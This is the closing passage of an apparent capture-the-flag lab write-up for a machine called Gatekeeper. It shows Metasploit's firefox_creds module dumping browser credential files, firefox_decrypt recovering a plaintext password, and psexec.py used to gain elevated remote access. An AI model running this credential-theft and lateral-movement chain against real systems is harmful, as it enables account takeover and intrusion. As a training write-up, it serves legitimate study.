 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
 Mozilla Firefox 75.0 (x86 en-US)                                    75.0
</code></pre><p>i see firefox is downloaded, which means i can dump its credentials and then use <a href="https://github.com/unode/firefox_decrypt">firefox decrypt</a> to decrypt them, allowing me to impersonate and log in as the target.</p>
<pre tabindex="0"><code>&gt; run post/multi/gather/firefox_creds

[+] Downloaded cert9.db: /home/kali/.msf4/loot/20211021043407_default_10.10.10.172_ff.ljfn812a.cert_898397.bin
[+] Downloaded cookies.sqlite: /home/kali/.msf4/loot/20211021043411_default_10.10.10.172_ff.ljfn812a.cook_582398.bin
[+] Downloaded key4.db: /home/kali/.msf4/loot/20211021043414_default_10.10.10.172_ff.ljfn812a.key4_936123.bin
[+] Downloaded logins.json: /home/kali/.msf4/loot/20211021043416_default_10.10.10.172_ff.ljfn812a.logi_001670.bin
</code></pre><p>i have to move the files from /.msf4/ to whichever folder i&rsquo;m working with, before running firefox_dcrypt.
but also, before i run firefox_dcrypt, i must rename each of the &ldquo;loot&rdquo; files to the corresponding names:</p>
<pre tabindex="0"><code>mv 20211021043407_default_10.10.248.88_ff.ljfn812a.cert_898397.bin cert9.db
mv 20211021043411_default_10.10.248.88_ff.ljfn812a.cook_582398.bin cookies.sqlite
mv 20211021043414_default_10.10.248.88_ff.ljfn812a.key4_936123.bin key4.db
mv 20211021043416_default_10.10.248.88_ff.ljfn812a.logi_001670.bin logins.json
</code></pre><p>running the tool, i get:</p>
<pre tabindex="0"><code>python3 firefox_decrypt.py /home/kali/gatekeeper/firefoxcreds/loot
Username: &#39;mayor&#39;
Password: &#39;8CL7O1N78MdrCIsV&#39;
</code></pre><p>so i have an elevated account&rsquo;s credentials. i can run psexec.py (which lets me execute programs on remote systems) using these credentials, effectively granting me special access.</p>
<pre tabindex="0"><code>python3 psexec.py mayor:8CL7O1N78MdrCIsV@10.10.10.172
</code></pre><p>as demonstrated, buffer overflows are incredibly powerful attack vectors that utilize deep understanding of how memory storage and program execution work in tandem. stopping them is not only difficult and potentially expensive, but necessary.</p>

        </div>
    </article>
</div>

    
     <script src="https://bsssq.xyz/p5/p5.min.js"></script>
     <script src="https://bsssq.xyz/js/genart.js"></script>
     <script src="https://bsssq.xyz/js/main.js"></script>
</body>
</html>